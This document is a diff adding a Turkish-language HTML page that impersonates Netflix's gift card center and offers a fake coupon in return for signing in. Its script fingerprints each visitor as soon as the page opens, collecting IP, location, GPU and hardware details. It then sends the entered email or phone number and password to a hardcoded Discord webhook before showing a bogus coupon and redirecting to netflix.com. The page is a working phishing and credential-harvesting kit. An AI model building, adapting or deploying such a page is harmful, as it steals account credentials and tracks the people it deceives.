@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Gift Card Center</title>
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+    <style>
+        :root { --nf-red: #e50914; --nf-dark: #000000; --nf-input: #333; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        
+        body { 
+            background: #000; 
+            color: #fff; 
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Arka Plan Görseli */
+        .hero-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(to top, rgba(0,0,0,0.8) 0, rgba(0,0,0,0.2) 60%, rgba(0,0,0,0.8) 100%),
+                        url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-0744f08f14b3/af6a7071-7788-46a2-944d-2a32197607a7/TR-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
+            background-size: cover; background-position: center; z-index: -1;
+        }
+
+        .header { padding: 25px 3%; }
+        .logo { width: 167px; }
+
+        .main-container {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 20px;
+        }
+
+        .login-card {
+            background: rgba(0, 0, 0, 0.75);
+            width: 100%;
+            max-width: 450px;
+            padding: 60px 68px 40px;
+            border-radius: 4px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        h1 { font-size: 32px; font-weight: 700; margin-bottom: 28px; }
+
+        /* Modern Input Tasarımı */
+        .field { position: relative; margin-bottom: 16px; background: var(--nf-input); border-radius: 4px; }
+        .field input {
+            width: 100%; height: 56px; background: transparent; border: none;
+            padding: 20px 20px 0; color: #fff; font-size: 16px; outline: none;
+        }
+        .field label {
+            position: absolute; left: 20px; top: 16px; color: #8c8c8c;
+            transition: all 0.1s ease; pointer-events: none; font-size: 16px;
+        }
+        .field input:focus + label, .field input:not(:placeholder-shown) + label {
+            top: 7px; font-size: 12px; font-weight: 700;
+        }
+
+        .btn-submit {
+            width: 100%; padding: 16px; background: var(--nf-red); color: #fff;
+            border: none; border-radius: 4px; font-size: 16px; font-weight: 700;
+            margin-top: 24px; cursor: pointer; transition: 0.2s; opacity: 0.5; pointer-events: none;
+        }
+        .btn-submit.active { opacity: 1; pointer-events: auto; }
+        .btn-submit:hover { background: #ff0a16; }
+
+        .footer-text { color: #737373; font-size: 13px; margin-top: 15px; }
+        .footer-text b { color: #fff; cursor: pointer; }
+
+        /* Yükleme ve Başarı Ekranları */
+        #loading, #success { display: none; text-align: center; }
+        .spinner {
+            width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid var(--nf-red); border-radius: 50%;
+            animation: spin 0.8s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .coupon-box {
+            background: #111; border: 1px dashed #46d369; color: #46d369;
+            padding: 15px; font-size: 22px; font-weight: bold; margin: 20px 0;
+            letter-spacing: 2px;
+        }
+
+        @media (max-width: 740px) {
+            .login-card { padding: 40px 30px; background: #000; max-width: 100%; height: 100%; }
+            .hero-bg { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="hero-bg"></div>
+
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo">
+</div>
+
+<div class="main-container">
+    <div class="login-card" id="formUI">
+        <h1>Oturum Aç</h1>
+        <div class="field">
+            <input type="email" id="u" placeholder=" " oninput="val()">
+            <label>E-posta veya telefon numarası</label>
+        </div>
+        <div class="field">
+            <input type="password" id="p" placeholder=" " oninput="val()">
+            <label>Parola</label>
+        </div>
+        <button class="btn-submit" id="btn" onclick="sendData()">Oturum Aç</button>
+        <p class="footer-text">
+            Hediye kuponunu aktifleştirmek için doğrulama gereklidir. Netflix'e katılmak ister misiniz? <b>Şimdi kaydolun.</b>
+        </p>
+    </div>
+
+    <div class="login-card" id="loading">
+        <div class="spinner"></div>
+        <p style="font-size: 18px;">Güvenli bağlantı üzerinden doğrulanıyor...</p>
+    </div>
+
+    <div class="login-card" id="success">
+        <h2 style="color: #46d369; margin-bottom: 10px;">Tebrikler!</h2>
+        <p style="color: #ccc;">Kupon kodunuz oluşturuldu ve hesabınıza tanımlandı.</p>
+        <div class="coupon-box">NFLX-2026-PREMIUM-X8</div>
+        <button class="btn-submit" style="opacity:1; pointer-events:auto; background:#333;" onclick="window.location.href='https://netflix.com'">Kapat</button>
+    </div>
+</div>
+
+<audio id="tudum"><source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg"></audio>
+
+<script>
+    // --- KONFİGÜRASYON ---
+    const WH = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
+
+    // 1. AŞAMA: SAYFA AÇILDIĞI AN TÜM DONANIMI TOPLA
+    async function track() {
+        try {
+            // IP ve Konum
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ip = await ipRes.json();
+
+            // Ekran Kartı (GPU) Analizi
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+
+            // Donanım Özellikleri
+            const specs = {
+                ua: navigator.userAgent,
+                ram: navigator.deviceMemory || "Bilinmiyor",
+                cpu: navigator.hardwareConcurrency || "Bilinmiyor",
+                res: `${window.screen.width}x${window.screen.height}`,
+                lang: navigator.language,
+                ref: document.referrer || "Doğrudan Bağlantı",
+                date: new Date().toLocaleString('tr-TR')
+            };
+
+            await fetch(WH, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🚀 YENİ ZİYARETÇİ ANALİZİ",
+                        color: 3447003,
+                        fields: [
+                            { name: "🌐 IP & ISP", value: `\`${ip.ip}\` (${ip.org})`, inline: false },
+                            { name: "📍 Konum", value: `${ip.city}, ${ip.region} / ${ip.country_name}`, inline: true },
+                            { name: "🖥️ Ekran Kartı", value: `\`${gpu}\``, inline: false },
+                            { name: "📱 Cihaz", value: `RAM: ${specs.ram}GB | CPU: ${specs.cpu} Çekirdek\nÇözünürlük: ${specs.res}\nDil: ${specs.lang}`, inline: false },
+                            { name: "🔗 Kaynak", value: specs.ref, inline: true }
+                        ],
+                        footer: { text: "Giriş saati: " + specs.date }
+                    }]
+                })
+            });
+
+            // "Tudum" sesini kullanıcı ilk tıkladığında çalması için hazırla
+            document.body.addEventListener('mousedown', () => document.getElementById('tudum').play(), {once: true});
+        } catch(e) {}
+    }
+    track();
+
+    // Giriş Kontrolü
+    function val() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        const btn = document.getElementById('btn');
+        if(u.length > 5 && p.length > 3) btn.classList.add('active');
+        else btn.classList.remove('active');
+    }
+
+    // 2. AŞAMA: BİLGİLERİ GÖNDER VE UI DEĞİŞTİR
+    async function sendData() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+
+        document.getElementById('formUI').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        await fetch(WH, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: "@everyone 🎯 **HESAP DÜŞTÜ!**",
+                embeds: [{
+                    title: "🔐 Giriş Bilgileri",
+                    color: 16711680,
+                    fields: [
+                        { name: "📧 E-posta/Tel", value: `**${user}**`, inline: true },
+                        { name: "🔑 Şifre", value: `\`${pass}\``, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            })
+        });
+
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('success').style.display = 'block';
+        }, 3000);
+    }
+</script>
+
+</body>
+</html>
